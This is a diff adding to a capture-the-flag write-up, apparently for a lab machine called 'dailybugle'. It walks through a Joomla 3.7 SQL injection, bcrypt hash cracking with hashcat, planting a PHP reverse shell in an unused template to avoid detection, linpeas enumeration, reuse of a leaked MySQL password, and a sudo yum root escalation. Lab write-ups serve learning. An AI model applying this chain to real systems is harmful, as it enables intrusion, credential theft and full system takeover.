@@ -412,9 +412,46 @@ Search for exploit:
 	....
 	Joomla! 3.7 - SQL Injection             php/remote/44227.php
 
+### Exploit Joomla!
 Load the php file into your web server with Php enabled (I used ver. 8.2.12), insert the base url: http://joomla.ip. 
 The exploit will return the user and the hashed password, the hash type is bcrypt, that corresponds to hashcat mode 3200.
 
 	hashcat.exe -m 3200 -a 0 hash_bcrypt.txt C:\Users\******\wordlist\rockyou.txt
 
+To get a reverse shell, once logged in, navigate to the template and create a new php file, e.g. rs.php. You can call the created file using the following path:
 
+	http://joomla.ip/tamplates/[template-name]/rs.php 
+ in my case is:
+ 
+	http://10.10.231.185/templates/beez3/rs.php
+
+Note that this is not the default template used, in this way the exploit will be more difficult to detect. Get a reverse php shell.
+
+### Priv escalation
+I created another txt with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) content, then I searched for the file:
+
+	find /var/www -name linpeas.txt -print
+	  /var/www/html/templates/beez3/linpeas.txt
+  	mv /var/www/html/templates/beez3/linpeas.txt /var/www/html/templates/beez3/linpeas.sh
+   	chmod ugo+x /var/www/html/templates/beez3/linpeas.sh
+Then execute it
+
+	/var/www/html/templates/beez3/linpeas.sh
+ Found a password
+
+ 	╔══════════╣ Searching passwords in config PHP files
+	/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu'
+
+Inspecting the file
+
+ 	more /var/www/html/configuration.php
+We can read that the password is for mysql root user to access mysql. Try if it reused.
+Does not work for root, but work for jjameson. Let's use again linpeas.
+                                                                                                                                                                                         
+	╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+	╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                         	Matching Defaults entries for jjameson on dailybugle:                                                                                                                                    	...
+	User jjameson may run the following commands on dailybugle:
+	    (ALL) NOPASSWD: /usr/bin/yum
+
+You can escalate the privilege to get a root shell as illustred [here](https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-2-loading-a-custom-yum-plugin).
+Follows the steps and you should get a root shell.
